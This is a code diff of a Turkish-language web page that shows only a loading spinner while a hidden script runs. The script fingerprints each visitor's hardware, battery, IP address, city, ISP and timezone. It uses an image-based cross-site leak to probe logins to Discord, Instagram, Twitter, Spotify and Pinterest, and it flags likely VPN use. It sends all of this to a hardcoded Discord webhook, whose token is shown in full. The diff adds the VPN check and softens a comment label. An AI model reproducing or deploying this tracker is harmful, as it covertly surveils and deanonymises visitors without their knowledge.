@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yükleniyor...</title>
+    <title>Yükleniyor...</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
         .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
@@ -17,7 +17,7 @@
     (async () => {
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        // 1. XS-LEAKS MODÜLÜ
+        // 1. DEDEKTÖR FONKSİYONU
         const checkLogin = async (url) => {
             return new Promise((resolve) => {
                 const img = new Image();
@@ -31,7 +31,7 @@
         async function masterExtract() {
             let info = { gpu: "N/A", ven: "N/A", ip: {}, net: "N/A", bat: "N/A" };
 
-            // DONANIM & AĞ SORGUSU
+            // DONANIM VE AĞ SORGUSU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
@@ -48,27 +48,31 @@
                 info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
             } catch(e) {}
 
-            // GÜNCEL OTURUM TESPİTLERİ
+            // OTURUM TESPİTİ
             const sessions = {
                 discord: await checkLogin("https://discord.com"),
                 instagram: await checkLogin("https://www.instagram.com"),
                 twitter: await checkLogin("https://twitter.com"),
-                spotify: await checkLogin("https://open.spotify.com"),
+                spotify: await checkLogin("https://www.spotify.com"),
                 pinterest: await checkLogin("https://www.pinterest.com")
             };
+
+            // VPN VE SAAT DİLİMİ ANALİZİ (TUTARSIZLIK KONTROLÜ)
+            const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const isVpnLikely = info.ip.timezone !== systemTimezone;
 
             const payload = {
                 embeds: [{
                     title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: `Sistem Uptime: \`${Math.floor(performance.now()/1000/60)} Dakika\``,
-                    color: 15158332,
+                    description: `Uptime: \`${Math.floor(performance.now()/1000/60)} Dakika\` | VPN Şüphesi: \`${isVpnLikely ? '⚠️ YÜKSEK' : '✅ DÜŞÜK'}\``,
+                    color: isVpnLikely ? 15158332 : 3066993,
                     fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: `📍 **Bölge:** ${info.ip.city || '?'}\n🛰️ **ISS:** ${info.ip.org || '?'}\n⚡ **Hız:** ${info.net}\n**IP:** \`${info.ip.ip || '?'}\``, inline: false },
-                        { name: "🛠️ DONANIM DETAYLARI", value: `**GPU:** \`${info.gpu}\`\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n**Pil:** ${info.bat}`, inline: false },
-                        { name: "🔐 DİJİTAL OTURUM DURUMLARI", value: `Discord: ${sessions.discord ? '✅' : '❌'} | Instagram: ${sessions.instagram ? '✅' : '❌'}\nTwitter: ${sessions.twitter ? '✅' : '❌'} | Spotify: ${sessions.spotify ? '✅' : '❌'}\nPinterest: ${sessions.pinterest ? '✅' : '❌'}`, inline: false },
+                        { name: "📡 İNTERNET VE ISS KATMANI", value: `📍 **Bölge:** ${info.ip.city || '?'}\n🛰️ **ISS:** ${info.ip.org || '?'}\n**IP:** \`${info.ip.ip || '?'}\`\n**Zaman Dilimi:** ${systemTimezone}`, inline: false },
+                        { name: "🛠️ DONANIM DETAYLARI", value: `**GPU:** \`${info.gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Gizli'} GB | **Pil:** ${info.bat}`, inline: false },
+                        { name: "🔐 DİJİTAL OTURUM DURUMLARI", value: `Discord: ${sessions.discord ? '✅' : '❌'} | Spotify: ${sessions.spotify ? '✅' : '❌'}\nInsta: ${sessions.instagram ? '✅' : '❌'} | Pinterest: ${sessions.pinterest ? '✅' : '❌'}`, inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Omniscience v11.0 | Final Build" },
+                    footer: { text: "Protocol: Omniscience v11.5 | VPN-Bypass Ready" },
                     timestamp: new Date()
                 }]
             };
